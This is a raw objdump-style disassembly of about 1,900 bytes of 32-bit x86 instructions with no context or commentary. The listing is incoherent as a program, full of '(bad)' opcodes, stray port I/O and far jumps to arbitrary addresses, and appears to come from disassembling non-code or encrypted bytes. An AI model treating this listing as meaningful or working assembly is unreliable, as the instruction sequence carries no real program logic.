  4166b1:	je     0x416705
  4166b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166b4:	cmp    al,0x17
  4166b6:	stos   BYTE PTR es:[edi],al
  4166b7:	into   
  4166b8:	push   ebx
  4166b9:	xor    eax,0xabbfde32
  4166be:	hlt    
  4166bf:	test   eax,0x79e19def
  4166c4:	test   eax,0x5db0991
  4166c9:	addr16 cwde 
  4166cb:	jne    0x4166f8
  4166cd:	mov    bl,BYTE PTR [ecx+0x387c44ab]
  4166d3:	adc    eax,0x286b20e3
  4166d8:	repz pop esi
  4166da:	xchg   ebp,eax
  4166db:	jo     0x4166ec
  4166dd:	dec    eax
  4166de:	add    BYTE PTR [eax+0x8],cl
  4166e1:	rcl    DWORD PTR [eax],cl
  4166e3:	sbb    edi,DWORD PTR [edx]
  4166e5:	and    BYTE PTR ds:0xdf64f908,0x73
  4166ec:	aaa    
  4166ed:	arpl   WORD PTR [ebp-0x35864133],cx
  4166f3:	sbb    ah,ah
  4166f5:	std    
  4166f6:	clc    
  4166f7:	inc    edi
  4166f8:	mov    al,0xfb
  4166fa:	jmp    0x66482dd0
  4166ff:	ins    DWORD PTR es:[edi],dx
  416700:	pop    edi
  416701:	fld    st(3)
  416703:	or     al,0x6b
  416705:	std    
  416706:	enter  0xbcbd,0x16
  41670a:	mov    esi,0x202ba35b
  41670f:	das    
  416710:	fstp   TBYTE PTR gs:[ebx+ecx*1+0x0]
  416715:	sbb    ch,BYTE PTR [esp+eax*4+0x7a]
  416719:	jmp    0xb95663bc
  41671e:	dec    esp
  41671f:	fxch   st(5)
  416721:	cmp    eax,0x54d504e
  416726:	(bad)  
  416727:	mov    al,ds:0xdbae9b51
  41672c:	sub    al,0x0
  41672e:	jae    0x416769
  416730:	xchg   ebp,eax
  416731:	into   
  416732:	push   es
  416733:	mov    ds:0x2be178b1,eax
  416738:	mov    dh,0xa5
  41673a:	and    eax,0x878938db
  41673f:	push   edi
  416740:	xchg   ebp,eax
  416741:	shr    BYTE PTR [ebx+0x64bceae7],cl
  416747:	push   es
  416748:	dec    ebp
  416749:	sub    al,0x0
  41674b:	sub    eax,0x289657e1
  416750:	or     cl,BYTE PTR [esi+0x4e]
  416753:	pop    esp
  416754:	adc    edi,ecx
  416756:	cmp    edx,ecx
  416758:	or     bh,cl
  41675a:	or     ch,BYTE PTR [ebx+0x5aae3880]
  416760:	mov    bl,0xfc
  416762:	lods   eax,DWORD PTR ds:[esi]
  416763:	cs pop ebp
  416765:	or     eax,0xb30f3e55
  41676a:	xchg   ebp,eax
  41676b:	adc    al,BYTE PTR [edi-0x19]
  41676e:	sbb    eax,0xf52fe617
  416773:	mov    ah,0xec
  416775:	das    
  416776:	adc    al,0x92
  416778:	(bad)  
  416779:	inc    DWORD PTR [ecx+0x26fd7b74]
  41677f:	dec    edx
  416780:	inc    edx
  416781:	aas    
  416782:	ret    
  416783:	in     eax,dx
  416784:	inc    ebp
  416785:	cli    
  416786:	mov    BYTE PTR [ecx-0x4d0118e6],dl
  41678c:	dec    edi
  41678d:	in     al,dx
  41678e:	test   eax,0x11db2099
  416793:	jns    0x4167fb
  416795:	sub    ch,dl
  416797:	pop    ebx
  416798:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416799:	dec    ebp
  41679a:	mov    al,ds:0x85d3332e
  41679f:	xchg   ebp,eax
  4167a0:	jge    0x416741
  4167a2:	xchg   eax,eax
  4167a4:	stos   BYTE PTR es:[edi],al
  4167a5:	aam    0x32
  4167a7:	into   
  4167a8:	in     al,0xc7
  4167aa:	sub    dl,BYTE PTR [eax-0x1f]
  4167ad:	sbb    ah,bh
  4167af:	sub    edx,DWORD PTR [ecx+0x730e8dd6]
  4167b5:	dec    esi
  4167b7:	push   edx
  4167b8:	inc    edi
  4167b9:	xor    eax,0xad58b132
  4167be:	out    0x80,al
  4167c0:	mov    esi,0x68afcfdc
  4167c5:	not    BYTE PTR ds:[ecx-0x47318ebb]
  4167cc:	or     ebp,0x2c
  4167cf:	dec    edx
  4167d0:	icebp  
  4167d1:	pop    eax
  4167d2:	pop    ebp
  4167d3:	mov    bl,0x11
  4167d5:	repz fwait
  4167d7:	xlat   BYTE PTR ds:[ebx]
  4167d8:	sub    eax,0x83b03515
  4167dd:	iret   
  4167de:	xlat   BYTE PTR ds:[ebx]
  4167df:	mov    esi,esi
  4167e1:	mov    WORD PTR [edi],?
  4167e3:	adc    al,0xac
  4167e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167e6:	xchg   esi,eax
  4167e7:	mov    ds:0xbb9bcb19,eax
  4167ec:	sub    BYTE PTR [edx-0x4e],0xde
  4167f0:	test   eax,0x46e93730
  4167f5:	jecxz  0x416796
  4167f7:	cmp    DWORD PTR [ecx+0x38],esp
  4167fa:	xchg   esp,eax
  4167fb:	gs nop
  4167fd:	nop
  4167fe:	aaa    
  4167ff:	dec    ebx
  416800:	ficom  DWORD PTR [ecx]
  416802:	mov    ds:0xa8e51bd0,eax
  416807:	and    DWORD PTR [ecx],0x9e6a7ea1
  41680d:	pusha  
  41680e:	jb     0x4167f7
  416810:	pop    es
  416811:	and    dh,ah
  416813:	pop    edx
  416814:	jno    0x416890
  416816:	pop    eax
  416817:	repnz test al,0xfc
  41681a:	aas    
  41681b:	sti    
  41681c:	and    edi,DWORD PTR ds:0x7b329364
  416822:	loope  0x4167a8
  416824:	imul   ecx,DWORD PTR ds:0x393987ed,0x32a9e8f1
  41682e:	shl    DWORD PTR [edi+0x17],cl
  416831:	inc    esp
  416832:	int3   
  416833:	mov    dh,0x31
  416835:	or     ebp,DWORD PTR [ebx]
  416837:	mov    ds:0x247f0505,eax
  41683c:	aad    0xa3
  41683e:	sbb    BYTE PTR [edi+eiz*8-0x5d],dh
  416842:	mov    bl,0x9d
  416844:	adc    eax,DWORD PTR [ebx]
  416846:	ficom  DWORD PTR [esi]
  416848:	xor    BYTE PTR [ecx],bl
  41684a:	stc    
  41684b:	dec    edx
  41684c:	xchg   esp,eax
  41684d:	push   0xffffffec
  41684f:	call   0xf531:0x3b481386
  416856:	ins    DWORD PTR es:[edi],dx
  416857:	push   ss
  416858:	arpl   si,bp
  41685a:	adc    BYTE PTR [edi+0x16],cl
  41685d:	leave  
  41685e:	jbe    0x416839
  416860:	mov    dh,0xc0
  416862:	fwait
  416863:	in     eax,0x91
  416865:	and    BYTE PTR [esi-0x31],0xa8
  416869:	jae    0x416809
  41686b:	cld    
  41686c:	pop    ss
  41686d:	sub    eax,0x43198eb9
  416872:	inc    ebx
  416873:	jns    0x416836
  416875:	mov    ebx,0x10a53269
  41687a:	xchg   BYTE PTR [ebp-0x598c352a],ah
  416880:	cmp    DWORD PTR [ebx-0x24df8607],edx
  416886:	(bad)  
  416887:	hlt    
  416888:	xor    BYTE PTR [esi-0x19],ch
  41688b:	xor    BYTE PTR [esi-0x77819bbc],ch
  416891:	mov    ah,0x50
  416893:	xchg   ecx,eax
  416894:	ret    
  416895:	push   ebx
  416896:	or     al,0xf9
  416898:	add    dh,ch
  41689a:	daa    
  41689b:	inc    edx
  41689c:	mov    es,WORD PTR [edi]
  41689e:	retf   
  41689f:	inc    ecx
  4168a0:	and    esi,DWORD PTR [ebx-0x34]
  4168a3:	dec    edx
  4168a4:	ror    BYTE PTR [edi],cl
  4168a6:	push   0xffffffa5
  4168a8:	jbe    0x41689b
  4168aa:	clc    
  4168ab:	or     esi,edi
  4168ad:	fs mov bl,0xc4
  4168b0:	call   0xd47e:0x9caa995b
  4168b7:	mov    ds:0x205d2395,eax
  4168bc:	inc    ecx
  4168bd:	jecxz  0x416924
  4168bf:	mov    esi,0x70c443c4
  4168c4:	dec    eax
  4168c5:	or     DWORD PTR [edx-0x39],esi
  4168c8:	test   BYTE PTR [edx+0x37],ch
  4168cb:	iret   
  4168cc:	mov    ss,edx
  4168ce:	(bad)  
  4168cf:	popf   
  4168d0:	mov    dl,BYTE PTR [esi]
  4168d2:	mov    dl,0xf3
  4168d4:	cmp    eax,0x8ec8e6b3
  4168d9:	rcl    cl,1
  4168db:	jge    0x4168f1
  4168dd:	hlt    
  4168de:	iret   
  4168df:	inc    eax
  4168e0:	adc    edi,DWORD PTR [esi]
  4168e2:	sbb    al,0xef
  4168e4:	std    
  4168e5:	cmp    ch,al
  4168e7:	mov    edx,0x34347fab
  4168ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168ed:	fmul   st,st(6)
  4168ef:	pop    es
  4168f0:	cwde   
  4168f1:	dec    edi
  4168f2:	nop
  4168f3:	rcr    DWORD PTR [ecx+0x4f],1
  4168f6:	mov    DWORD PTR fs:[edi],esp
  4168f9:	xlat   BYTE PTR ds:[ebx]
  4168fa:	xor    BYTE PTR [edi+ecx*8-0x4d],0x23
  4168ff:	inc    edx
  416900:	push   ss
  416901:	add    al,0x5b
  416903:	push   eax
  416904:	int3   
  416905:	dec    eax
  416906:	out    dx,al
  416907:	mov    bh,0x5c
  416909:	(bad)  
  41690a:	stos   DWORD PTR es:[edi],eax
  41690b:	sub    eax,0x394d191c
  416910:	mov    fs,WORD PTR [esi+0x40487530]
  416916:	scas   eax,DWORD PTR es:[edi]
  416917:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416918:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416919:	add    al,0xd7
  41691b:	(bad)  
  41691c:	push   cs
  41691d:	dec    ecx
  41691e:	jbe    0x4168e8
  416920:	sub    ebx,DWORD PTR [ecx-0x78]
  416923:	mov    ds:0xc3f651ee,eax
  416928:	xor    BYTE PTR [eax-0x19],0xb2
  41692c:	mov    bl,0x9d
  41692e:	or     dh,BYTE PTR [ecx-0x7a]
  416931:	test   DWORD PTR [edi+0x37],ecx
  416934:	inc    esp
  416935:	jmp    0x289b2a2f
  41693a:	mov    ecx,0x9e1941cc
  41693f:	mov    ds:0xabb1e0bd,al
  416944:	mov    al,gs:0xc84f04b5
  41694a:	mov    es,WORD PTR [eax]
  41694c:	push   esi
  41694d:	jnp    0x416914
  41694f:	ss into 
  416951:	out    dx,al
  416952:	pusha  
  416953:	out    dx,eax
  416954:	rcr    ah,cl
  416956:	and    BYTE PTR [ebx-0x1f],ah
  416959:	stos   DWORD PTR es:[edi],eax
  41695a:	mov    eax,ds:0x9c85d134
  41695f:	pop    ebp
  416960:	and    DWORD PTR [esi+0x52c18ea1],ecx
  416966:	daa    
  416967:	cld    
  416968:	cli    
  416969:	jnp    0x4169e9
  41696b:	inc    ebp
  41696c:	cmp    al,0x45
  41696e:	out    dx,eax
  41696f:	ficom  DWORD PTR [edx-0x30]
  416972:	inc    ecx
  416973:	dec    ebp
  416974:	inc    edi
  416975:	inc    ebx
  416976:	dec    ebx
  416977:	fdivr  QWORD PTR [ecx-0x5bb9a5c5]
  41697d:	imul   BYTE PTR ds:0x87a3cc5f
  416983:	icebp  
  416984:	pop    ebx
  416985:	push   cs
  416986:	cmp    BYTE PTR [ebp-0x53ee67],bl
  41698c:	outs   dx,BYTE PTR ds:[esi]
  41698d:	xor    DWORD PTR [ebp-0x4],esp
  416990:	pop    ebx
  416991:	inc    edx
  416992:	jae    0x416986
  416994:	push   ss
  416995:	in     al,dx
  416996:	jbe    0x416971
  416998:	nop
  416999:	xchg   ecx,eax
  41699a:	mov    gs,WORD PTR [ebp-0x62]
  41699d:	das    
  41699e:	(bad)  
  41699f:	cmc    
  4169a0:	and    bl,bh
  4169a2:	cld    
  4169a3:	rcr    DWORD PTR ds:0x83d9a7b2,1
  4169a9:	inc    ebx
  4169aa:	test   DWORD PTR [ecx],esp
  4169ac:	test   al,0x3d
  4169ae:	(bad)  
  4169af:	mov    ds:0x4edec1d,al
  4169b4:	arpl   WORD PTR [esi-0x23],bx
  4169b7:	push   eax
  4169b8:	sub    DWORD PTR [ebx+0x3e],edi
  4169bb:	and    bh,dh
  4169bd:	cld    
  4169be:	popa   
  4169bf:	cmp    DWORD PTR [ebx+0x4ffdce0c],edx
  4169c5:	test   eax,0xd2358cbf
  4169ca:	xchg   cl,bl
  4169cc:	inc    edx
  4169cd:	or     eax,0x3b08b0a9
  4169d2:	fst    DWORD PTR [esi-0x7641d4fc]
  4169d8:	cmp    al,0xc6
  4169da:	mov    dl,0x99
  4169dc:	and    al,0x84
  4169de:	xor    ebx,ecx
  4169e0:	push   ds
  4169e1:	sbb    al,0xc5
  4169e3:	out    0x0,al
  4169e5:	pop    esp
  4169e6:	jnp    0x416a5c
  4169e8:	ret    
  4169e9:	popa   
  4169ea:	(bad)  
  4169eb:	pop    DWORD PTR [ebx]
  4169ed:	push   esp
  4169ee:	jmp    0x416a48
  4169f0:	cs not ebx
  4169f3:	push   ebp
  4169f4:	push   ecx
  4169f5:	and    al,BYTE PTR [eax-0x5efe9743]
  4169fb:	in     eax,0xe8
  4169fd:	arpl   WORD PTR fs:[eax-0x60],sp
  416a01:	push   eax
  416a02:	std    
  416a03:	fwait
  416a04:	push   es
  416a05:	inc    esi
  416a06:	lock mov ch,BYTE PTR [eax]
  416a09:	icebp  
  416a0a:	mov    edx,0x8a625fcc
  416a0f:	mov    al,0x1e
  416a11:	jecxz  0x4169a1
  416a13:	sub    ah,BYTE PTR [eax+0x27]
  416a16:	stc    
  416a17:	and    al,0x24
  416a19:	into   
  416a1a:	and    BYTE PTR [ebx],0x78
  416a1d:	mov    al,0x15
  416a1f:	ins    BYTE PTR es:[edi],dx
  416a20:	sub    eax,0x8d954eac
  416a25:	imul   BYTE PTR ds:0x9c150712
  416a2b:	sahf   
  416a2c:	ins    BYTE PTR es:[edi],dx
  416a2d:	cmp    cl,dl
  416a2f:	cdq    
  416a30:	add    DWORD PTR [ebx+0x2bf0deca],ebp
  416a36:	icebp  
  416a37:	xor    esi,DWORD PTR [ecx]
  416a39:	pop    edx
  416a3a:	cmp    esi,DWORD PTR [eax+0x73]
  416a3d:	outs   dx,DWORD PTR ds:[si]
  416a3f:	std    
  416a40:	pop    eax
  416a41:	push   ds
  416a42:	scas   eax,DWORD PTR es:[edi]
  416a43:	scas   eax,DWORD PTR es:[edi]
  416a44:	ds nop
  416a46:	int3   
  416a47:	mov    al,0x27
  416a49:	push   esi
  416a4a:	out    dx,eax
  416a4b:	sar    BYTE PTR [edi],cl
  416a4d:	jmp    0x4169e4
  416a4f:	pop    es
  416a50:	push   esi
  416a51:	mov    bh,0x3
  416a53:	pop    eax
  416a54:	cmp    edx,DWORD PTR [esi-0xf]
  416a57:	sub    dl,cl
  416a59:	scas   al,BYTE PTR es:[edi]
  416a5a:	retf   
  416a5b:	iret   
  416a5c:	fs popf 
  416a5e:	pop    ebp
  416a5f:	dec    edx
  416a60:	sbb    DWORD PTR [eax*2-0x2da71264],0x6fb03dd3
  416a6b:	out    0x9c,al
  416a6d:	sti    
  416a6e:	loope  0x416aa7
  416a70:	pop    ds
  416a71:	fbstp  TBYTE PTR [edx]
  416a73:	push   edx
  416a74:	icebp  
  416a75:	mov    cl,0x52
  416a77:	ja     0x416a5d
  416a79:	dec    esp
  416a7a:	lea    ebx,[edi+0x863e4f]
  416a80:	sub    eax,DWORD PTR [edx]
  416a82:	(bad)  
  416a83:	pop    eax
  416a84:	dec    edx
  416a85:	inc    edx
  416a86:	mov    esi,0x3468e158
  416a8b:	cmp    ebp,DWORD PTR [ebx+0x7c]
  416a8e:	icebp  
  416a8f:	shr    BYTE PTR [esi-0x17],cl
  416a92:	mov    esp,DWORD PTR [edi-0x73fb3d06]
  416a98:	ins    DWORD PTR es:[edi],dx
  416a99:	xchg   edx,eax
  416a9a:	pop    esp
  416a9b:	xor    eax,0xa039dc79
  416aa0:	jp     0x416abe
  416aa2:	mov    al,ds:0xe95b6daa
  416aa7:	icebp  
  416aa8:	daa    
  416aa9:	inc    eax
  416aaa:	or     eax,DWORD PTR [ecx]
  416aac:	add    eax,0xedb6f904
  416ab1:	loop   0x416a3c
  416ab3:	ins    BYTE PTR es:[edi],dx
  416ab4:	out    0x9b,al
  416ab6:	mov    edx,0xd7f9e1d7
  416abb:	les    esp,FWORD PTR [edx-0x51ca917f]
  416ac1:	arpl   sp,cx
  416ac3:	fbld   TBYTE PTR [edx-0x71]
  416ac6:	mov    esi,0x3d71d9b1
  416acb:	outs   dx,DWORD PTR ds:[esi]
  416acc:	push   edi
  416acd:	mov    ecx,0xf824ddb5
  416ad2:	pop    DWORD PTR [ebp-0x5b]
  416ad5:	mov    ebx,0x99a1924
  416ada:	in     al,dx
  416adb:	clc    
  416adc:	add    ah,BYTE PTR [ebx]
  416ade:	imul   DWORD PTR [ecx+0x4ef3c66b]
  416ae4:	pop    es
  416ae5:	mov    dh,0x27
  416ae7:	sub    DWORD PTR [ecx-0x22e28a5e],0x2b5167d3
  416af1:	fstp   DWORD PTR [esi-0x5779e4a7]
  416af7:	mov    ds:0x4320cbd5,al
  416afc:	xchg   edi,eax
  416afd:	jl     0x416a90
  416aff:	lahf   
  416b00:	inc    ebp
  416b01:	fcmovnbe st,st(7)
  416b03:	aas    
  416b04:	jge    0x416ab2
  416b06:	pop    ecx
  416b07:	adc    ebp,DWORD PTR [ecx]
  416b09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b0a:	pop    ss
  416b0b:	xor    eax,DWORD PTR [ebp-0x308ff61]
  416b11:	inc    esi
  416b12:	sahf   
  416b13:	sub    esp,DWORD PTR [ecx+0x72b3c55a]
  416b19:	fidivr DWORD PTR [ebp+0xd]
  416b1c:	xchg   esi,eax
  416b1d:	mov    cl,0xc
  416b1f:	jae    0x416b1a
  416b21:	cmp    BYTE PTR [esi+0x64],al
  416b24:	lds    edx,FWORD PTR ds:0xf4d663ff
  416b2a:	dec    DWORD PTR [edi-0x6170a5bd]
  416b30:	dec    esp
  416b31:	daa    
  416b32:	pushf  
  416b33:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  416b35:	shl    DWORD PTR [edi-0x5cfe813d],1
  416b3b:	xor    BYTE PTR [eax],bl
  416b3d:	loope  0x416bb4
  416b3f:	cmp    al,al
  416b41:	jmp    0x59e5:0x71c94398
  416b48:	jne    0x416b8a
  416b4a:	jg     0x416b93
  416b4c:	stc    
  416b4d:	mov    ebp,0x951c39b7
  416b52:	into   
  416b53:	in     eax,dx
  416b54:	jg     0x416bb9
  416b56:	adc    BYTE PTR [edx+0x31],dl
  416b59:	ret    
  416b5a:	ds in  al,dx
  416b5c:	test   al,0xa5
  416b5e:	mov    edx,0x5aac21dd
  416b63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b64:	js     0x416bc1
  416b66:	call   0x6f1:0xb47e680
  416b6d:	lds    esi,FWORD PTR [ebx+0x7c4d5df]
  416b73:	add    DWORD PTR fs:[esi+eiz*4-0x24],esi
  416b78:	dec    edi
  416b79:	je     0x416bad
  416b7b:	jmp    0x416b39
  416b7d:	xchg   esp,eax
  416b7e:	xchg   esi,eax
  416b7f:	icebp  
  416b80:	dec    esp
  416b81:	add    al,0xe1
  416b83:	out    0x7e,al
  416b85:	shl    DWORD PTR [edi],0x3
  416b88:	mov    ch,0x9
  416b8a:	jb     0x416b80
  416b8c:	imul   ebx,DWORD PTR [edx-0x2c],0xece3ef9d
  416b93:	ret    
  416b94:	jno    0x416b1e
  416b96:	sub    bh,BYTE PTR [ebx-0x7f26e18a]
  416b9c:	xchg   esp,eax
  416b9d:	pop    ecx
  416b9e:	mov    BYTE PTR [eax-0xe],ah
  416ba1:	addr16 in eax,0xa4
  416ba4:	int    0xd2
  416ba6:	imul   ebx,esp,0x89300957
  416bac:	addr16 mov ds:0xfbd5,al
  416bb0:	dec    ecx
  416bb1:	jg     0x416c25
  416bb3:	in     al,dx
  416bb4:	dec    ebx
  416bb5:	inc    ecx
  416bb6:	stos   BYTE PTR es:[edi],al
  416bb7:	jecxz  0x416c2f
  416bb9:	sar    bh,1
  416bbb:	jl     0x416c1a
  416bbd:	xchg   esp,eax
  416bbe:	inc    esi
  416bbf:	and    eax,0x3d6c0049
  416bc4:	call   0x5b30:0x33aace6f
  416bcb:	sbb    DWORD PTR [ebx],ecx
  416bcd:	mov    al,fs:0x20ebf46d
  416bd3:	gs loope 0x416bc9
  416bd6:	gs cld 
  416bd8:	imul   esp,DWORD PTR ds:0x8cfd5502,0x22
  416bdf:	cmp    edi,esi
  416be1:	ficomp WORD PTR [eax]
  416be3:	retf   0xc771
  416be6:	pushf  
  416be7:	gs mov dl,0x21
  416bea:	ret    0xfe6c
  416bed:	dec    ebx
  416bee:	(bad)  
  416bef:	in     eax,0x9f
  416bf1:	or     dh,BYTE PTR [ebx+0x8a22ee0]
  416bf7:	add    ecx,ebp
  416bf9:	pop    ebp
  416bfa:	mov    es,edi
  416bfc:	add    eax,0x45392397
  416c01:	repnz dec edx
  416c03:	add    DWORD PTR [esi-0x18359e75],eax
  416c09:	sub    al,0xd7
  416c0b:	jne    0x416c4d
  416c0d:	test   BYTE PTR [edx-0x70a7bd59],al
  416c13:	dec    ebx
  416c14:	mov    ds:0x4836fb4d,eax
  416c19:	jae    0x416c13
  416c1b:	push   ebx
  416c1c:	add    bh,BYTE PTR [ecx+0x3c23a842]
  416c22:	ja     0x416c1f
  416c24:	aas    
  416c25:	jmp    0x416bcc
  416c27:	jne    0x416c80
  416c29:	iret   
  416c2a:	out    0xee,eax
  416c2c:	add    cl,bl
  416c2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c2f:	retf   
  416c30:	out    0xc6,al
  416c32:	jle    0x416c1c
  416c34:	daa    
  416c35:	mov    BYTE PTR [eax-0x25],dh
  416c38:	xchg   ebp,eax
  416c39:	loope  0x416bc5
  416c3b:	adc    eax,0xef05027f
  416c40:	retf   0x107d
  416c43:	mov    eax,0x11f06a1b
  416c48:	pop    esi
  416c49:	push   esp
  416c4a:	stos   DWORD PTR es:[edi],eax
  416c4b:	sub    ebp,DWORD PTR ds:0xd1a94ee
  416c51:	shl    DWORD PTR [edi],0xec
  416c54:	jge    0x416c88
  416c56:	dec    esi
  416c57:	or     BYTE PTR [ecx+0x7],bh
  416c5a:	xor    ebx,ebp
  416c5c:	xor    BYTE PTR [ecx-0x477957c4],dl
  416c62:	dec    eax
  416c63:	imul   DWORD PTR [ebx+eax*8]
  416c66:	jp     0x416bf8
  416c68:	sub    eax,0x89819361
  416c6d:	push   0x70
  416c6f:	ins    BYTE PTR es:[edi],dx
  416c70:	pop    eax
  416c71:	cmp    eax,0xb39e9692
  416c76:	fs das 
  416c78:	and    edx,ecx
  416c7a:	popa   
  416c7b:	inc    esi
  416c7c:	or     al,0xf9
  416c7e:	int3   
  416c7f:	inc    esi
  416c80:	mov    al,ds:0xd411dc50
  416c85:	mov    es,WORD PTR [edi-0x4ef24f94]
  416c8b:	ror    DWORD PTR [edx],1
  416c8d:	inc    ebp
  416c8e:	mov    ebp,0x8f9297cf
  416c93:	dec    eax
  416c94:	mov    ah,0xa7
  416c96:	mov    al,ds:0x729c4f84
  416c9b:	cli    
  416c9c:	or     eax,0xb96e6fd9
  416ca1:	jle    0x416d1a
  416ca3:	pop    es
  416ca4:	mov    ebx,0xfc10e6c9
  416ca9:	pop    ds
  416caa:	jnp    0x416ce3
  416cac:	cmc    
  416cad:	sbb    al,0xf7
  416caf:	xchg   ebp,eax
  416cb0:	jns    0x416c8d
  416cb2:	mov    ds:0x90cf4f4a,al
  416cb7:	les    ecx,FWORD PTR [edi+0x65d9b786]
  416cbd:	stc    
  416cbe:	xor    DWORD PTR [eax+0x61],eax
  416cc1:	pop    esi
  416cc2:	sbb    eax,ecx
  416cc4:	clc    
  416cc5:	add    BYTE PTR [ebx],bh
  416cc7:	jle    0x416d38
  416cc9:	test   eax,0x4adadc9
  416cce:	and    eax,0x52d8c39e
  416cd3:	adc    ebp,esp
  416cd5:	call   0x6a97d238
  416cda:	mov    esp,0x4ab5b45f
  416cdf:	hlt    
  416ce0:	in     al,dx
  416ce1:	stos   BYTE PTR es:[edi],al
  416ce2:	stos   DWORD PTR es:[edi],eax
  416ce3:	cmp    eax,0x70ee9053
  416ce8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ce9:	aas    
  416cea:	sahf   
  416ceb:	dec    ecx
  416cec:	dec    ebp
  416ced:	call   0xa41c:0x61d7b4b9
  416cf4:	xchg   bh,ch
  416cf6:	out    0x78,al
  416cf8:	out    dx,eax
  416cf9:	fcom   QWORD PTR [ebx-0x5130b326]
  416cff:	fcmove st,st(4)
  416d01:	sub    BYTE PTR [esi],0xc2
  416d04:	cmc    
  416d05:	or     al,BYTE PTR [ecx+0x55]
  416d08:	je     0x416d03
  416d0a:	dec    edx
  416d0b:	push   cs
  416d0c:	pop    ebp
  416d0d:	repz fadd QWORD PTR [edx-0x64]
  416d11:	(bad)  
  416d12:	xor    ah,ch
  416d14:	cdq    
  416d15:	jp     0x416cfe
  416d17:	push   ebp
  416d18:	pop    es
  416d19:	dec    eax
  416d1a:	mov    cl,0x4e
  416d1c:	push   edx
  416d1d:	cmp    DWORD PTR [edi+0xb451111],esp
  416d23:	jl     0x416cdd
  416d25:	ins    DWORD PTR es:[edi],dx
  416d26:	scas   eax,DWORD PTR es:[edi]
  416d27:	aaa    
  416d28:	adc    BYTE PTR [ebx-0x25],dl
  416d2b:	stos   DWORD PTR es:[edi],eax
  416d2c:	mul    DWORD PTR [ecx+0x27]
  416d2f:	outs   dx,DWORD PTR ds:[esi]
  416d30:	in     eax,dx
  416d31:	retf   0xa10b
  416d34:	and    al,0x32
  416d36:	mov    edi,0xd89e5884
  416d3b:	or     dl,BYTE PTR [edi+edx*8]
  416d3e:	arpl   WORD PTR ds:0xd8967f9c,si
  416d44:	mov    eax,ds:0x36612d9e
  416d49:	cmp    DWORD PTR [edx],0xffffff98
  416d4c:	pop    ds
  416d4d:	test   al,0x28
  416d4f:	cmp    DWORD PTR [edx-0x5cd37318],0x82d41e99
  416d59:	mov    dh,0x45
  416d5b:	xchg   esi,eax
  416d5c:	fild   DWORD PTR ds:0x4ec766f1
  416d62:	mov    ch,0x3
  416d64:	pop    ebx
  416d65:	imul   edi,DWORD PTR [ebx+eiz*8+0x72],0xffffffa6
  416d6a:	sub    BYTE PTR [edi],dl
  416d6c:	(bad)  
  416d6d:	paddusb mm4,QWORD PTR [ecx-0x72dcf45b]
  416d74:	fwait
  416d75:	into   
  416d76:	inc    ecx
  416d77:	call   0xef482205
  416d7c:	or     DWORD PTR [ecx+0xcb7740f],0xa
  416d83:	lods   eax,DWORD PTR ds:[esi]
  416d84:	shl    BYTE PTR [ebx],cl
  416d86:	jge    0x416da8
  416d88:	in     al,dx
  416d89:	add    DWORD PTR [esi-0x240d8f64],edi
  416d8f:	inc    ebp
  416d90:	loop   0x416d24
  416d92:	mov    ch,0xf9
  416d94:	sbb    al,0x16
  416d96:	je     0x416d87
  416d98:	push   ds
  416d99:	sub    al,0xe0
  416d9b:	mov    eax,0x2d0115db
  416da0:	or     esp,ebp
  416da2:	aam    0xe6
  416da4:	int    0x25
  416da6:	sbb    DWORD PTR [ebp+0x7a],edx
  416da9:	inc    ebp
  416daa:	in     eax,dx
  416dab:	fdiv   DWORD PTR [esi-0x5d35946b]
  416db1:	fs mul ch
  416db4:	xchg   ebp,eax
  416db5:	call   0xe26af4e7
  416dba:	hlt    
  416dbb:	xor    al,0x83
  416dbd:	pop    edi
  416dbe:	cld    
  416dbf:	daa    
  416dc0:	adc    eax,0x12c8a388
  416dc5:	lods   al,BYTE PTR ds:[esi]
  416dc6:	(bad)  
  416dc8:	(bad)  
  416dca:	rcr    DWORD PTR [ebx],0x11
  416dcd:	xchg   BYTE PTR [ebx],dh
  416dcf:	fbstp  TBYTE PTR [edx+edx*8-0x43]
  416dd3:	ins    DWORD PTR es:[edi],dx
  416dd4:	test   DWORD PTR [ecx+0x32],eax
  416dd7:	push   ebp
  416dd8:	xchg   edi,eax
  416dd9:	cmp    ah,ch
  416ddb:	xchg   ebx,eax
  416ddc:	out    dx,al
  416ddd:	and    al,0xba
  416ddf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416de0:	stos   DWORD PTR es:[edi],eax
  416de1:	call   0x42a9a491
  416de6:	(bad)  
  416de7:	mov    ebp,0x8a54b0b7
  416dec:	jg     0x416da1
  416dee:	in     eax,0xf
  416df0:	mov    DWORD PTR [eax-0x48],esi
  416df3:	idiv   DWORD PTR [ebx+0xd]
  416df6:	mov    eax,0x432ee7a9
  416dfb:	in     eax,dx
  416dfc:	dec    ebp
  416dfd:	mov    ebp,0xdb427eb8
  416e02:	dec    eax
  416e03:	mov    bl,0xdd
  416e05:	xchg   ecx,eax
  416e06:	call   0xc879:0x105b064d
  416e0d:	stos   BYTE PTR es:[edi],al
  416e0e:	js     0x416e73
  416e10:	mov    ebp,0x6ee409d7
  416e15:	mov    esp,0xcfe3429d
  416e1a:	mov    ebx,0x643e8ed6
  416e1f:	or     ebx,DWORD PTR [ebx]
  416e21:	fdiv   DWORD PTR [edx-0x6]
  416e24:	and    cl,BYTE PTR [ebp+0x1c5e9ea3]
  416e2a:	comiss xmm2,DWORD PTR [edx-0x72]
  416e2e:	shr    DWORD PTR [edx+0x2f5a3c3d],1
  416e34:	adc    al,0xbd
  416e36:	loop   0x416e1f
  416e38:	out    dx,al
  416e39:	loop   0x416dd8
  416e3b:	mul    BYTE PTR [ebx-0x61519fa7]
  416e41:	fs or  al,0xf5
  416e44:	push   ss
  416e45:	mov    esi,0xb90dcd23
  416e4a:	ret    
  416e4b:	scas   al,BYTE PTR es:[edi]
  416e4c:	test   al,0xe
  416e4e:	aam    0x7e
  416e50:	and    BYTE PTR [eax-0x2032960f],ch
  416e56:	inc    ebp
  416e57:	nop
  416e58:	jns    0x416ed6
